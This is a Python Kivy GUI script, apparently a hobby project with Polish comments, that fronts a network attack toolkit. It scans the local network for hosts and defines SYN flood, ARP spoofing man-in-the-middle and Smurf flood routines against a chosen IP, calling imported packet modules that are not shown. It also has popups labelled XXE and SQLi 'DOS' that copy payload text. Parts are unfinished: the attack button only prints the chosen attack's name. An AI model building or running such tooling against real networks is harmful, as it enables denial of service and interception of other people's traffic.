from asyncio.base_futures import _FINISHED
from threading import Thread
import threading
from time import sleep

from kivy.clock import Clock
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.uix.floatlayout import FloatLayout
from kivy.animation import Animation
from kivy.uix.popup import Popup
from zmq import NULL
from modules.arp import ARPSpoofer, disable_ip_forwarding, enable_ip_forwarding


import modules.auxilliary
from modules.smurf_attack import smurf_packet
from modules.syn_flood import syn_flood_packet


class MyApp(App):
    def build(self):
        return FloatLayouts()

class FloatLayouts(FloatLayout):
    def CickedOne(self):
        showPopUp1()

    def CickedTwo(self):
        showPopUp2()

    def CickedThree(self):
        showPopUp3()

    def CickedFour(self):
        showPopUp4()


class P1(FloatLayout):
    ATTACK_STOP = False
    Dane = modules.auxilliary.dane()
    c = NULL
    finished = True
    Dane.STOP = False
    def ClickedConf1(self):
        Clock.schedule_interval(self.Refresh, 1)
        if(P1.finished==True):
            if(P1.c==NULL):
                P1.finished = False
                P1.c = Thread(target=self.SearchForHosts)
                #P1.c.daemon = True
                P1.c.start()
                
                
        else:
            self.Dane.STOP = True
            P1.c.join()
            self.ids.scan_button.text = "Scan"
            P1.c = NULL
            P1.finished = True
        
        
    def spinner_clicked(self, value):
        print("Selected ip is " + value)
        self.ids.button_atk.disabled = False


    def spinner_clicked_atk(self, value):
        print("Selected attack is " + value)


    
    def ClickedConf1_atk(self):
        if(self.ATTACK_STOP == False):
            #Run attack
            self.ids.button_atk.text = "Stop"
            if (self.ids.spinner_id_atk.text == "SYN flood"):
                print("Syn")
            elif (self.ids.spinner_id_atk.text == "ARP spoof"):
                print("ARP")
            elif (self.ids.spinner_id_atk.text == "Smurf"):
                print("Smurf")
            else:
                print("Nieznany atak")
        else:
            #Stop attack
            self.ids.button_atk.text = "Attack"
            self.ATTACK_STOP = True



    def SearchForHosts(self):
        net_info = self.Dane.get_network_info()
        print(net_info)
        result = self.Dane.scan_network_multi_thread(net_info[3],net_info[4])
        print(result)
        P1.finished = True
        print("[INFO] succesfully closed threads")
        try:
            P1.c.join()
        except:
            print("kupa")
        P1.c = NULL

    def Refresh(self, interval):
        if(P1.finished == False):
            self.ids.scan_button.text = self.Dane.Percent
            #print("r-"+self.Dane.Percent)
            self.ids.spinner_id.values = self.Dane.HOSTS
        else:
            self.ids.scan_button.text = "Scan"

    def SynFlood(self, IP):
        self.ids.Satus_label.text = "[b]Attack status: Scanning[/b]"
        print("starting syn flood")
        port = self.Dane.scan_host_ports_multi_thread_get_first(IP)
        self.ids.Satus_label.text = "[b]Attack status: Attacking[/b]"
        threads = []
        while(self.ATTACK_STOP != True):
            thread = threading.Thread(target = syn_flood_packet,args = [str(IP),port])
            sleep(0.2)
            thread.start()
            threads.append(thread)
        
        print("ending syn flood")
        for t in threads:
            t.join()
        self.ATTACK_STOP = False
        print("syn flood closed all threads")
    
    def ARP(self, IP):
        print("starting ARP")
        self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"

        #to nie będzie działać, trzeba przerobić funkcję tak by dało się ją wylączyć
        enable_ip_forwarding()
        spoofer = ARPSpoofer("Wlan 0", IP, self.Dane.HOSTS[0])
        spoofer.mitm()
        disable_ip_forwarding()
        #koniec fragmentu do edycji

        self.ids.Satus_label.text = "[b]Attack status: Finished[/b]"
        self.ATTACK_STOP = False
    
    def Smurf(self, IP):
        print("starting Smurf")
        self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"
        while(self.ATTACK_STOP != True):
            smurf_packet(IP)
        self.ids.Satus_label.text = "[b]Attack status: Finished[/b]"
        self.ATTACK_STOP = False

      
        
        

    

class P2(FloatLayout):
    def ClickedConf2(self):
        print("button on conf 2")
        self.ids.XXE_ID.copy(data=self.ids.XXE_ID.text)

class P3(FloatLayout):
    def ClickedConf3(self):
        print("button on conf 3")
        self.ids.SQLI_ID.copy(data=self.ids.SQLI_ID.text)

class P4(FloatLayout):
    def ClickedConf4(self):
        print("button on conf 4")
    

def showPopUp1():
    show = P1()
    popupWindow = Popup(title="Wifi DOS Conf", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()

def showPopUp2():
    show = P2()
    popupWindow = Popup(title="XXE DOS", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()

def showPopUp3():
    show = P3()
    popupWindow = Popup(title="SQLI DOS", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()
    

def showPopUp4():
    show = P4()
    popupWindow = Popup(title="App4", content=show, size_hint=(0.8,0.8) )
    popupWindow.open()


if __name__ == '__main__':
    MyApp().run()
